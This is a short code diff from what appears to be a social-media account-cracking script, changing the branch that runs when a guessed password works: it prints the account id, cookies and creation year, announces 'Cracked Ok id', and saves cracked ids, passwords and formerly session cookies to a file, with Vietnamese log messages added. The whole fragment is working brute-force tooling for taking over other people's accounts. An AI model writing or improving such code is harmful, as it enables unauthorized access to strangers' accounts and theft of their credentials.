@@ -807,9 +807,15 @@ def login_1(uid):
                     f"\x1b[1;97m|\x1b[38;5;46m{cookies}"
                     f"\x1b[1;97m|\x1b[38;5;15m{creationyear(uid)}"
                 )
-                os.system('espeak -a 300 " Cracked Ok id,"')
-                with open('/sdcard/ARNOLD-OLD-OK.txt', 'a') as f:
-                    f.write(f"{uid}|{pw}|{cookies}\n")
+                try:
+                    with open(file_name, "a", encoding="utf-8") as file:
+                        json_string = json.dumps(res, ensure_ascii=False)
+                        file.write(f"{uid}|{pw}|{creationyear(uid)}|lol" + "\n")
+                    print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
+                except IOError as e:
+                    print(f"Lỗi khi ghi file: {e}")
+                except Exception as e:
+                    print(f"Đã xảy ra lỗi: {e}")
                 oks.append(uid)
                 break
         loop += 1
